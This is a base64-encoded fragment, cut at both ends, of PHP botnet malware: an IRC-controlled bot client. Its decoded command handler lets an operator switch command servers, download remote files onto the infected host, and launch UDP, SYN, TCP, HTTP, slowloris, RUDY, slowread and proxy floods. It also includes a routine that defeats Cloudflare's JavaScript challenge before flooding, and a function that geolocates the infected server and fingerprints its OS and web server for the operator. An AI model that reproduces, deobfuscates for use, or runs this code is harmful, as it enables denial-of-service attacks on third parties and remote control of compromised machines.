gogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiICAgICAgOiAiIC4gdHJpbSgkcmV0WyRpXSkpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJ1ZC5zZXJ2ZXIiOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY291bnQoJG1jbWQpID4gMikgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNvbmZpZ1snc2VydmVyJ10gPSAkbWNtZFsxXTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5jb25maWdbJ3BvcnQnXSAgID0gJG1jbWRbMl07CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaXNzZXQoJG1jbWNkWzNdKSkgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5jb25maWdbJ3Bhc3MnXSA9ICRtY21kWzNdOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMnVwZGF0ZVwyXTogaW5mbyB1cGRhdGVkICIgLiAkbWNtZFsxXSAuICI6IiAuICRtY21kWzJdIC4gIiBwYXNzOiAiIC4gJG1jbWRbM10pOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDJ1cGRhdGVcMl06IHN3aXRjaGVkIHNlcnZlciB0byAiIC4gJG1jbWRbMV0gLiAiOiIgLiAkbWNtZFsyXSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJHRoaXMtPmNvbm4pOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImRvd25sb2FkIjoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvdW50KCRtY21kKSA+IDIpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJGZwID0gZm9wZW4oJG1jbWRbMl0sICJ3IikpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDJkb3dubG9hZFwyXTogY291bGQgbm90IG9wZW4gb3V0cHV0IGZpbGUuIik7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJGdldCA9IGZpbGUoJG1jbWRbMV0pKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMmRvd25sb2FkXDJdOiBjb3VsZCBub3QgZG93bmxvYWQgXDIiIC4gJG1jbWRbMV0gLiAiXDIiKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKCRpID0gMDsgJGkgPD0gY291bnQoJGdldCk7ICRpKyspIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ3cml0ZSgkZnAsICRnZXRbJGldKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDJkb3dubG9hZFwyXTogZmlsZSBcMiIgLiAkbWNtZFsxXSAuICJcMiBkb3dubG9hZGVkIHRvIFwyIiAuICRtY21kWzJdIC4gIlwyIik7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZjbG9zZSgkZnApOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wyZG93bmxvYWRcMl06IHVzZSAuZG93bmxvYWQgaHR0cDovL3lvdXIuaG9zdC9maWxlIC90bXAvZmlsZSIpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInVkcGZsb29kIjoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvdW50KCRtY21kKSA+IDQpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT51ZHBmbG9vZCgkbWNtZFsxXSwgJG1jbWRbMl0sICRtY21kWzNdLCAkbWNtZFs0XSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAidGNwY29ubiI6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCgkbWNtZCkgPiA1KSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+dGNwY29ubigkbWNtZFsxXSwgJG1jbWRbMl0sICRtY21kWzNdKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJydWR5IjoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvdW50KCRtY21kKSA+IDIpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5kb1Nsb3coJG1jbWRbMV0sICRtY21kWzJdKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJzbG93cmVhZCI6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCgkbWNtZCkgPiAzKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2xvd1JlYWQoJG1jbWRbMV0sICRtY21kWzJdLCAkbWNtZFszXSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAic2xvd2xvcmlzIjoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvdW50KCRtY21kKSA+IDIpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5kb1Nsb3coJG1jbWRbMV0sICRtY21kWzJdKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJzeW5mbG9vZCI6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCgkbWNtZCkgPiAzKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c3luZmxvb2QoJG1jbWRbMV0sICRtY21kWzJdLCAkbWNtZFszXSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJsNyI6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCgkbWNtZCkgPiAzKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJG1jbWRbMV0gPT0gImdldCIpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+YXR0YWNrX2h0dHAoIkdFVCIsICRtY21kWzJdLCAkbWNtZFszXSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJG1jbWRbMV0gPT0gInBvc3QiKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmF0dGFja19wb3N0KCRtY21kWzJdLCAkbWNtZFszXSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJG1jbWRbMV0gPT0gImhlYWQiKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmF0dGFja19odHRwKCJIRUFEIiwgJG1jbWRbMl0sICRtY21kWzNdKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJzeW4iOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY291bnQoJG1jbWQpID4gMikgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnN5bigkbWNtZFsxXSwgJG1jbWRbMl0sICRtY21kWzNdLCAkbWNtZFs0XSk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJzeW50YXg6IHN5biBob3N0IHBvcnQgdGltZSBbZGVsYXlTZWNvbmRzXSIpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInRjcGZsb29kIjoKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvdW50KCRtY21kKSA+IDIpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT50Y3BmbG9vZCgkbWNtZFsxXSwgJG1jbWRbMl0sICRtY21kWzNdKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgInN5bnRheDogdGNwZmxvb2QgaG9zdCBwb3J0IHRpbWUiKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJodHRwZmxvb2QiOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY291bnQoJG1jbWQpID4gMikgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmh0dHBmbG9vZCgkbWNtZFsxXSwgJG1jbWRbMl0sICRtY21kWzNdLCAkbWNtZFs0XSwgJG1jbWRbNV0pOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAic3ludGF4OiBodHRwZmxvb2QgaG9zdCBwb3J0IHRpbWUgW21ldGhvZF0gW3VybF0iKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJwcm94eWh0dHBmbG9vZCI6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCgkbWNtZCkgPiAyKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJveHlodHRwZmxvb2QoJG1jbWRbMV0sICRtY21kWzJdLCAkbWNtZFszXSwgJG1jbWRbNF0pOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAic3ludGF4OiBwcm94eWh0dHBmbG9vZCB0YXJnZXRVcmwod2l0aCBodHRwOi8vKSBwcm94eUxpc3RVcmwgdGltZSBbbWV0aG9kXSIpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImNsb3VkZmxhcmVmbG9vZCI6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50X3IoJG1jbWQpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY291bnQoJG1jbWQpID4gMikgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNsb3VkZmxhcmVmbG9vZCgkbWNtZFsxXSwgJG1jbWRbMl0sICRtY21kWzNdLCAkbWNtZFs0XSwgJG1jbWRbNV0sICRtY21kWzZdKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgInN5bnRheDogY2xvdWRmbGFyZWZsb29kIGhvc3QgcG9ydCB0aW1lIFttZXRob2RdIFt1cmxdIFtwb3N0RmllbGRzXSIpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwoKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICB9CgogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBzZW5kKCRtc2cpIHsKCiAgICAgICAgZndyaXRlKCR0aGlzLT5jb25uLCAkbXNnIC4gIlxyXG4iKTsKCiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIGpvaW4oJGNoYW4sICRrZXkgPSBOVUxMKSB7CgogICAgICAgICR0aGlzLT5zZW5kKCJKT0lOICIgLiAkY2hhbiAuICIgIiAuICRrZXkpOwoKICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gcHJpdm1zZygkdG8sICRtc2cpIHsKCiAgICAgICAgJHRoaXMtPnNlbmQoIlBSSVZNU0cgIiAuICR0byAuICIgOiIgLiAkbXNnKTsKCiAgICB9CgogICAgcHVibGljIGZ1bmN0aW9uIG5vdGljZSgkdG8sICRtc2cpIHsKCiAgICAgICAgJHRoaXMtPnNlbmQoIk5PVElDRSAiIC4gJHRvIC4gIiA6IiAuICRtc2cpOwoKICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0X25pY2soKSB7CgogICAgICAgICRmcCA9IGZzb2Nrb3BlbigiZnJlZWdlb2lwLm5ldCIsIDgwLCAkZHVtbXksICRkdW1teSwgMzApOwoKICAgICAgICBpZighJGZwKQoKICAgICAgICAgICAgJHRoaXMtPm5pY2sgPSAiW0ZUUF0iOwoKICAgICAgICBlbHNlIHsKCiAgICAgICAgICAgIGZjbG9zZSgkZnApOwoKICAgICAgICAgICAgJGN0eCA9IHN0cmVhbV9jb250ZXh0X2NyZWF0ZShhcnJheSgKCiAgICAgICAgICAgICAgICAnaHR0cCcgPT4gYXJyYXkoCgogICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAzMAoKICAgICAgICAgICAgICAgICkKCiAgICAgICAgICAgICkpOwoKICAgICAgICAgICAgJGJ1ZiA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vZnJlZWdlb2lwLm5ldC9qc29uLyIsIDAsICRjdHgpOwoKICAgICAgICAgICAgaWYoIXN0cnN0cigkYnVmLCAiY291bnRyeV9jb2RlIikpCgogICAgICAgICAgICAgICAgJHRoaXMtPm5pY2sgPSAiW0ZUUF0iOwoKICAgICAgICAgICAgZWxzZSB7CgogICAgICAgICAgICAgICAgJGNvZGUgICAgICAgPSBzdHJzdHIoJGJ1ZiwgImNvdW50cnlfY29kZSIpOwoKICAgICAgICAgICAgICAgICRjb2RlICAgICAgID0gc3Vic3RyKCRjb2RlLCAxMik7CgogICAgICAgICAgICAgICAgJGNvZGUgICAgICAgPSBzdWJzdHIoJGNvZGUsIDMsIDIpOwoKICAgICAgICAgICAgICAgICR0aGlzLT5uaWNrID0gIlsiIC4gJGNvZGUgLiAiXSI7CgogICAgICAgICAgICB9CgogICAgICAgIH0KCiAgICAgICAgaWYoc3RydG91cHBlcihzdWJzdHIoUEhQX09TLCAwLCAzKSkgPT09ICdXSU4nKQoKICAgICAgICAgICAgJHRoaXMtPm5pY2sgLj0gIltXSU4zMl0iOwoKICAgICAgICBlbHNlCgogICAgICAgICAgICAkdGhpcy0+bmljayAuPSAiW0xJTlVYXSI7CgogICAgICAgIGlmIChpc3NldCgkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ10pKSB7CgogICAgICAgICAgICBpZihzdHJzdHIoc3RydG9sb3dlcigkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ10pLCAiYXBhY2hlIikpCgogICAgICAgICAgICAgICAgJHRoaXMtPm5pY2sgLj0gIltBXSI7CgogICAgICAgICAgICBlbHNlaWYoc3Ryc3RyKHN0cnRvbG93ZXIoJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddKSwgImlpcyIpKQoKICAgICAgICAgICAgICAgICR0aGlzLT5uaWNrIC49ICJbSV0iOwoKICAgICAgICAgICAgZWxzZWlmKHN0cnN0cihzdHJ0b2xvd2VyKCRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXSksICJ4aXRhbWkiKSkKCiAgICAgICAgICAgICAgICAkdGhpcy0+bmljayAuPSAiW1hdIjsKCiAgICAgICAgICAgIGVsc2VpZihzdHJzdHIoc3RydG9sb3dlcigkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ10pLCAibmdpbngiKSkKCiAgICAgICAgICAgICAgICAkdGhpcy0+bmljayAuPSAiW05dIjsKCiAgICAgICAgICAgIGVsc2UKCiAgICAgICAgICAgICAgICAkdGhpcy0+bmljayAuPSAiW1VdIjsKCiAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICR0aGlzLT5uaWNrIC49ICJbQ10iOwoKICAgICAgICB9CgogICAgICAgICR0aGlzLT5uaWNrIC49ICR0aGlzLT5jb25maWdbJ3ByZWZpeCddOwoKICAgICAgICBmb3IoJGkgPSAwOyAkaSA8ICR0aGlzLT5jb25maWdbJ21heHJhbmQnXTsgJGkrKykKCiAgICAgICAgICAgICR0aGlzLT5uaWNrIC49IG10X3JhbmQoMCwgOSk7CgogICAgICAgICR0aGlzLT5zZW5kKCJOSUNLICIgLiAkdGhpcy0+bmljayk7CgogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBjbG91ZGZsYXJlZmxvb2QoJGhvc3QsICRwb3J0LCAkdGltZSwgJG1ldGhvZD0iR0VUIiwgJHVybD0iLyIsICRwb3N0PWFycmF5KCkpIHsKCiAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wyQ2xvdWRGbGFyZUZsb29kIFN0YXJ0ZWQhXDJdIik7CgogICAgICAgICR0aW1laSAgICA9IHRpbWUoKTsKCiAgICAgICAgJHVzZXJfYWdlbnQgPSAkdGhpcy0+dXNlcl9hZ2VudHNbcmFuZCgwLCBjb3VudCgkdGhpcy0+dXNlcl9hZ2VudHMpLTEpXTsKCiAgICAgICAgJHBhY2tldCA9ICIkbWV0aG9kICR1cmwgSFRUUC8xLjFcclxuIjsKCiAgICAgICAgJHBhY2tldCAuPSAiSG9zdDogJGhvc3RcclxuIjsKCiAgICAgICAgJHBhY2tldCAuPSAiS2VlcC1BbGl2ZTogMzAwXHJcbiI7CgogICAgICAgICRwYWNrZXQgLj0gIkNvbm5lY3Rpb246IGtlZXAtYWxpdmVcclxuIjsKCiAgICAgICAgJHBhY2tldCAuPSAiVXNlci1BZ2VudDogJHVzZXJfYWdlbnRcclxuIjsKCiAgICAgICAgLy9DbG91ZGZsYXJlIEJ5cGFzcwoKICAgICAgICAkcmVzID0gIGN1cmwoJGhvc3QsIG51bGwsICR1c2VyX2FnZW50LCB0cnVlKTsKCiAgICAgICAgLy9DbG91ZGZsYXJlIEJ5cGFzcwoKICAgICAgICBpZiAoc3Ryc3RyKCRyZXMsICJERG9TIHByb3RlY3Rpb24gYnkgQ2xvdWRGbGFyZSIpKSB7CgogICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDJDbG91ZEZsYXJlIGRldGVjdGVkIS4uLlwyXSIpOwoKICAgICAgICAgICAgLy9HZXQgdGhlIG1hdGggY2FsYwoKICAgICAgICAgICAgJG1hdGhfY2FsYyA9IGdldF9iZXR3ZWVuKCRyZXMsICJhLnZhbHVlID0gIiwgIjsiKTsKCiAgICAgICAgICAgIGlmICgkbWF0aF9jYWxjKSB7CgogICAgICAgICAgICAgICAgJG1hdGhfcmVzdWx0ID0gKGludCkgZXZhbCgicmV0dXJuICgkbWF0aF9jYWxjKTsiKTsKCiAgICAgICAgICAgICAgICBpZiAoaXNfbnVtZXJpYygkbWF0aF9yZXN1bHQpKSB7CgogICAgICAgICAgICAgICAgICAgICRtYXRoX3Jlc3VsdCArPSBzdHJsZW4oJGhvc3QpOyAvL0RvbWFpbiBsZW5naHQKCiAgICAgICAgICAgICAgICAgICAgLy9TZW5kIHRoZSBDbG91ZEZsYXJlJ3MgZm9ybQoKICAgICAgICAgICAgICAgICAgICAkZ2V0RGF0YSA9ICJjZG4tY2dpL2wvY2hrX2pzY2hsIjsKCiAgICAgICAgICAgICAgICAgICAgJGdldERhdGEgLj0gIj9qc2NobF92Yz0iLmdldF9iZXR3ZWVuKCRyZXMsICduYW1lPSJqc2NobF92YyIgdmFsdWU9IicsICciJyk7CgogICAgICAgICAgICAgICAgICAgICRnZXREYXRhIC49ICImanNjaGxfYW5zd2VyPSIuJG1hdGhfcmVzdWx0OwoKICAgICAgICAgICAgICAgICAgICAkcmVzID0gY3VybCgkaG9zdC4kZ2V0RGF0YSwgbnVsbCwgJHVzZXJfYWdlbnQpOwoKICAgICAgICAgICAgICAgICAgICAvL0Nsb3VkZmxhcmUgQnlwYXNzZWQ/CgogICAgICAgICAgICAgICAgICAgIGlmIChzdHJzdHIoJHJlcywgIkREb1MgcHJvdGVjdGlvbiBieSBDbG91ZEZsYXJlIikpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMkNsb3VkRmxhcmUgbm90IGJ5cGFzc2VkLi4uXDJdIik7CgoKCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICRieXBhc3NlZCA9IHRydWU7CgogICAgICAgICAgICAgICAgICAgICAgICAvL0Nvb2tpZSByZWFkCgogICAgICAgICAgICAgICAgICAgICAgICAkY29va2llID0gdHJpbShnZXRfYmV0d2VlbihmaWxlX2dldF9jb250ZW50cygiY29va2llLnR4dCIpLCAiX19jZmR1aWQiLCAiXG4iKSk7CgogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0IC49ICJDb29raWU6IF9fY2ZkdWlkPSIuJGNvb2tpZS4iXHJcblxyXG4iOwoKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCAiW1wyQ2xvdWRGbGFyZSBub3QgZGV0ZWN0ZWQuLi5cMl0iKTsKCiAgICAgICAgfQoKICAgICAgICBpZiAoJGJ5cGFzc2VkKSB7CgogICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sICJbXDJDbG91ZEZsYXJlIGJ5cGFzc2VkIVwyXSIpOwoKICAgICAgICB9CgogICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwgIltcMkZsb2RkaW5nLi4uXDJdIik7CgogICAgICAgIHdoaWxlICh0aW1lKCkgLSAkdGltZWkgPCAkdGltZSkgewoKICAgICAgICAgICAgJGhhbmRsZSA9IGZzb2Nrb3BlbigkaG9zdCwgJHBvcnQsICRlcnJubywgJGVycnN0ciwgMSk7CgogICAgICAgICAgICBmd3JpdGUoJGhhbmRsZSwgJHBhY2tldCk7CgogICAgICAgIH0KCiAgICAgICAgJHRoaXM